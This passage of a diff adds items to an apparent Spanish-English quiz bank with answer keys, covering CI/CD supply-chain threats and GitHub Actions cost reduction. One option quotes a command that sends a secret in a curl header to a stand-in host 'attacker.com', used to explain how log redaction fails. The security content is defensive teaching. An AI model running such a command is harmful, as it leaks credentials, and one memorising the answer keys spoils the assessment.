+        { "letter": "C", "text": "Secrets exfiltration via logs: 'echo $SECRET' redactado, pero 'curl -H \"Auth: $SECRET\" attacker.com' NO redactado. Base64 encode + exfiltrate. Attacker con PR access puede extraer secrets exposed al workflow. Mitigation: least-privilege secrets (workflow solo accesa secrets que necesita), environment-scoped.", "correct": true, "why": "Correcto. Log redaction is naive substring matching. Enough obfuscation en el output bypass. Solución no es depender solo de redaction — es LIMIT secret exposure to workflows that genuinely need." },
+        { "letter": "D", "text": "Self-hosted runner compromise: attacker con PR write puede execute code en tu runner. Persistent runners con state accumulated = state leaks entre users. Especialmente peligroso con network access to internal systems. Mitigation: ephemeral runners + private repos only.", "correct": true, "why": "Correcto. Self-hosted en public repo es riesgo enorme. Codecov compromise 2021 tuvo elemento self-hosted. Ephemeral runners minimize blast radius." },
+        { "letter": "E", "text": "GitHub Actions es infalible y no tiene attack surface.", "correct": false, "why": "Falso — cualquier CI/CD tiene attack surface. Hay que treat CI infra con production-grade security. Múltiples breaches documentados." }
+      ],
+      "explanation": "Threat model de CI/CD (SLSA levels de reference): (1) Source integrity — commits authenticated (signed), branch protection. (2) Build integrity — build reproducible, isolated builds, provenance recorded. (3) Deploy integrity — verified artifacts (signatures), deploy authentication (OIDC preferred). (4) Runtime — attestations en cada step.\n\nAttack scenarios: (1) Malicious action author — pushes update con backdoor. Users usando @main immediately affected. Mitigation: pin SHA. (2) Supply chain — dependency de action compromised (npm, docker image base). Mitigation: SBOM, scanning. (3) Insider — malicious insider merges backdoor. Mitigation: required 2-person review, signed commits. (4) Credential theft — secret extracted via log, stored insecurely, or via runtime access. Mitigation: OIDC, environment scoping. (5) Runner compromise — RCE on runner via malicious PR. Mitigation: ephemeral, private repos.\n\nSpecific mitigations por platform: (1) GHA — 'Restrict actions to selected orgs', pin SHAs, disable pull_request_target usage sin review. (2) Jenkins — Master aislado, agents en secured network, plugins vetted. (3) GitLab — restrict runners to specific projects, ephemeral runners. (4) CircleCI — orb restrictions, context restrictions.\n\nAudit checklist: (1) List all third-party actions used, verify each. (2) List all secrets, review scope. (3) Review workflows for pull_request_target. (4) List self-hosted runners, verify ephemeral + private. (5) OIDC where possible. (6) Log monitoring for anomalies.",
+      "realWorld": "Codecov 2021: bash uploader script tampering exfiltrated secrets. Impacted thousands of orgs. Post-mortem seminal en supply chain security. CircleCI 2023: security incident, all secrets required rotation. tj-actions/changed-files 2023: popular action compromised. SolarWinds 2020: not CI directly but supply chain classic — years of attacker access.",
+      "tags": ["security", "supply chain", "threat model"],
+      "tech": ["GitHub Actions", "SLSA"],
+      "references": [{ "title": "GitHub Docs — Security hardening for GitHub Actions" }, { "title": "SLSA.dev" }]
+    },
+    {
+      "id": "q20",
+      "areaId": "vcs-ci",
+      "topic": "Cost management en CI",
+      "difficulty": "staff",
+      "scenario": "Tu team gastó $50k en GitHub Actions minutos el último mes. CTO pide reducir 40%. ¿Qué levers tirar?",
+      "question": "¿Qué estrategias reducen CI cost significantly?",
+      "multiSelect": true,
+      "options": [
+        { "letter": "A", "text": "Right-size runners: default GHA es 2-core Ubuntu. Para builds pequeños fine. Para builds pesados, larger runners (8-core) buildean 3x más rápido, cost 4x — pero puede ser wall-time-optimal. Analyze: cual es sweet spot para tu workload. Cambio simple, high impact.", "correct": true, "why": "Correcto. Larger runners: 8-core = 4x cost pero 3-4x speed. Para hot path (main CI), often worth it. Para nightly non-urgent, small runners fine." },
+        { "letter": "B", "text": "Selective execution: paths filters, skip PRs que solo cambian docs, skip CI en drafts. Cada CI evitado = savings directos. En monorepos, 'affected only' vs 'all' es diferencia 10x.", "correct": true, "why": "Correcto. Path filters + affected detection son huge. 30% de CI runs are unnecessary en repos maduros." },
+        { "letter": "C", "text": "Self-hosted en cloud: EC2 spot instances via ARC — $0.03/hour para c5.large vs $0.008/min GHA-hosted = $0.48/hour. Break-even ~500 hours/month per instance. Above that, self-hosted cheaper.", "correct": true, "why": "Correcto. Break-even math clear. Enterprises con high CI usage (500+ hours/month/team) suelen ahorrar 60-80% con self-hosted spot instances. Trade-off: ops overhead." },
+        { "letter": "D", "text": "Cache aggressively: dep cache, docker layer cache, test result cache. Reduce actual work per run. 8min → 2min = 75% saving en minutes.", "correct": true, "why": "Correcto. La palanca más simple. Cache work well-implementado suele reducir 40-60% del CI time = proportional cost saving." },
+        { "letter": "E", "text": "Simplemente pagar más — CI cost no importa.", "correct": false, "why": "En scale (500+ devs), CI cost puede ser $100k+/month. No es negligible. Además, CI slow = dev time waste, mayor cost." }
+      ],
+      "explanation": "CI cost math en scale: (1) 500 devs × 5 CI runs/day × 10min × 20 workdays × $0.008/min = $200k/month naive. Optimizations combined typically reduce 60-70%.\n\nStrategies stack (in order of ROI): (1) Path filters + skip conditions — free, immediate 20-30% reduction. (2) Caching (deps, docker, test results) — 40-60% reduction. (3) Right-size runners — 20-40% depending workload. (4) Self-hosted spot — 60-80% reduction en high-usage teams. (5) Turborepo/Nx affected — 50-80% en monorepos. (6) Skip low-value work — nightly full runs, PR partial runs.\n\nMonitoring: (1) GHA billing dashboard — cost by workflow, actor. (2) Custom dashboards — top consumers, trending. (3) Alerts on spike (someone left infinite loop en workflow). (4) Chargeback to teams — visibility drives efficiency.\n\nAnti-savings (avoid): (1) Reducing test coverage — false economy. Tests catch prod bugs = huge value. (2) Manual CI (skip automation) — reduces CI cost but massively increases dev time cost. (3) Batch CI runs (only nightly) — kills feedback loop, integration hell.\n\nOrg patterns: (1) Central 'DevOps platform' team owns runner infra, offers 'CI as service' to product teams. Chargeback. (2) Runner pool sharing across teams. (3) Migration to self-hosted done gradually as usage justifies. (4) Regular 'CI hackathons' to optimize workflows.",
+      "realWorld": "Shopify migrated massively de CircleCI a self-hosted Buildkite para cost. GitLab published their internal CI cost breakdowns publicly. Uber uses Bazel + custom infra to control cost. En 2023, Cloudflare wrote about their CI cost optimization. Vercel/Turborepo whole business built around monorepo CI cost.",
+      "tags": ["cost", "optimization", "self-hosted"],
+      "tech": ["GitHub Actions", "AWS"],
+      "references": [{ "title": "GitHub Docs — About billing for GitHub Actions" }, { "title": "Actions Runner Controller" }]
+    }
+  ]
+}
